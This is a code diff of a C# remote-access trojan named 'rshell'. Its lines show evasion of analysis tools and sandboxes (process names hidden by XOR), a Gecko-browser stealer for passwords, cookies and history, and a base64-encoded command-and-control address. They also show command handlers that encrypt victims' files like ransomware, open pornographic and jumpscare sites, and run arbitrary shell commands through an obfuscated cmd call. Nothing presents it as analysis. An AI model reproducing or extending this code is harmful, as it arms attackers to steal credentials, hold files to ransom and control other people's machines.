@@ -1,160 +1,24 @@
-        // Libraries    
-        #region Lib
-        using System;
-        using System.IO;
-        using System.Net;
-        using System.Linq;
-        using System.Text;
-        using Crying.Reader;
-        using Microsoft.CSharp;
-        using Crying.Helpers;
-        using System.Drawing;
-        using System.Net.Http;
-        using System.Threading;
-        using System.Reflection;
-        using System.Windows.Forms;
-        using System.Diagnostics;
-        using Microsoft.VisualBasic;
-        using System.ServiceProcess;
-        using System.Threading.Tasks;
-        using System.Collections.Generic;
-        using static Crying.Helpers.Common;
-        using System.Net.NetworkInformation;
-        using System.Security.Cryptography;
-        using System.Runtime.InteropServices;
-        using System.Collections.Specialized;
-        using System.Text.RegularExpressions;
+// Libraries    
+using System;
+using System.IO;
+using System.Net;
+using System.Linq;
+using System.Text;
+using Crying.Reader;
+using Crying.Helpers;
+using System.Threading;
+using System.Diagnostics;
+using System.ServiceProcess;
+using System.Collections.Generic;
+using static Crying.Helpers.Common;
+using System.Net.NetworkInformation;
 
-    namespace rshell
-    {
-        #endregion
-
-        // Varis = blocks known applications using XOR cipher
-        #region VariksenPelätin
-        class ProgramStarter
-        {
-            // xor
-            #region
-            static string xor(string text, int n = 256)
-            {
-                byte[] input = Encoding.UTF8.GetBytes(text);
-                byte[] output = new byte[input.Length];
-                int i = 0;
-                foreach (byte b in input)
-                {
-                    output[i] = (byte)(b ^ n);
-                    i++;
-                }
-                return Encoding.UTF8.GetString(output);
-        }
-        #endregion
-
-        public static bool Starter()
-        {
-            string[] list = new string[] {
-                                        "QOTCUNGTM",
-                                        "OBGW",
-                                        "IJJ_BDA",
-                                        "RGUMKAT",
-                                        "VTIECUUNGEMCT",
-                                        "VTIEC^V",
-                                        "BHUV_",
-                                        "OBGW",
-                                        "OKKSHOR_BCDSAACT",
-                                        "QOTCUNGTM",
-                                        "BSKVEGV",
-                                        "NIIMC^VJITCT",
-                                        "OKVITRTCE",
-                                        "VCRIIJU",
-                                        "JITBVC",
-                                        "U_UOHUVCERIT",
-                                        "VTIEyGHGJ_\\CT",
-                                        "U_UGHGJ_\\CT",
-                                        "UHO@@yNOR",
-                                        "QOHBDA",
-                                        "LICDI^EIHRTIJ",
-                                        "@OBBJCT",
-                                        "LICDI^UCTPCT",
-                                        "OBG",
-                                        "OBG",
-                                        "PKRIIJUB",
-                                        "PKQGTCRTGR",
-                                        "PKQGTCSUCT",
-                                        "PKGERNJV",
-                                        "PDI^UCTPOEC",
-                                        "PDI^RTG_",
-                                        "MUBSKVCT",
-                                        "TCEJGUHCR",
-                                        "^BDA",
-                                        "IJJ_BDA",
-                                        "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
-                                        "^BDA",
-                                        "MUBSKVCT",
-                                        "NRRVBCDSAACT"
-
-                                    };
-
-            foreach (Process p in Process.GetProcesses())
-            {
-                foreach (string name in list)
-                {
-                    if (xor(p.ProcessName.ToLower(), 38).Contains(name))
-                    {
-                        return true;
-                    }
-                }
-            }
-
-            return false;
-
-        }
-        
-        #endregion
-
-        // Lepakko = Password stealer engine. Steals from all gecko browsers.
-        #region Lepakko
-        class lepakko
-        {
-            static void LepakkoMies(string[] args)
-            {
-                // Get command line args
-                string arguments = string.Join(" ", args).ToLower();
-                if (string.IsNullOrEmpty(arguments))
-                {
-                    Console.WriteLine("passwords/cookies/history/bookmarks");
-                    Environment.Exit(1);
-                }
-
-                foreach (string browser in Profile.GetMozillaBrowsers())
-                {
-                    // Show info
-                    Console.WriteLine("Reading " + arguments + " from " + new DirectoryInfo(browser).Name + " browser.");
-
-                    // :::::::DDDDDDD VITTU KEKSI t: Viljami
-                    // Get cookies
-
-                    // Get history
-                    if (arguments.Equals("history"))
-                    {
-                        foreach (Site history in History.Get(browser))
-                        {
-                            Console.WriteLine(BrowserUtils.FormatHistory(history));
-                        }
-                    }
-                }
-                Console.WriteLine("DONE");
-            }
-        }
-
-        #endregion
-
-
-        // Connecting engine, Starter engine, FailFast engine runner, Commands.
-        #region RShell
+namespace rshell
+{
         static class Rshell
         {
 
-            static string address = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLw=="; // Your IP address in Base64
+            static string address = "aHR0cDovLzE5Mi4xNjguMzkuMTM5OjgwODAv"; // Your IP address in Base64
             static string version = "1337";
 
             static string token = Utils.RandomString(15);
@@ -167,18 +31,15 @@
                 while (true)
                 {
                     if (ProgramStarter.Starter()) { Environment.FailFast(null); }
-                    if (Environment.MachineName == "WDAGUtilityAccount")
-                    {
-                        Environment.FailFast(null);
-                    }
+                    if (Environment.MachineName == "WDAGUtilityAccount")  { Environment.FailFast(null); }
                     Thread.Sleep(100);
                 }
             }
 
             static void Main()
             {
-                //connect
-                new Thread(Join).Start();
+            //connect
+            new Thread(Join).Start();
                 Installer.Install();
                 Runner();
             }
@@ -327,8 +188,8 @@
                                     message.Add("text", String.Join("\n", Cooki));
 
                                     break;
-
                                 case "history":
+
                                     List<string> Hist = new List<string>();
                                     foreach (string browser in Profile.GetMozillaBrowsers())
                                         foreach (Site history in History.Get(browser))
@@ -510,19 +371,21 @@
                                     Process.Start("https://heavy-r.com/video/257138/Mature_Wife_Sex_With_2_Guys/");
                                     break;
 
-                                case "jumpScare":
+                                case "jumpscare":
                                     Process.Start("https://pnrtscr.com/kqrkc7");
                                     break;
 
-                                case "Encrypt":
+                            case "encrypt":
+                                new Thread(Encryptor.Encrypt).Start();
+                                message.Add("Text", "Started Encrypting");
+                                break;
 
-                                    break;
+                            case "decrypt":
+                                new Thread(Decryptor.Decrypt).Start();
+                                message.Add("Text", "Started Decrypting");
+                                break;
 
-                                case "Decrypt":
-
-                                    break;
-
-                                default:
+                            default:
                                     message.Add("text", Utils.Exec(String.Join("", "dmc".ToCharArray().Reverse().ToArray()), "/C " + text, timeout));
                                     break;
                             }
@@ -547,5 +410,3 @@
             }
         }
     }
-}
-            #endregion
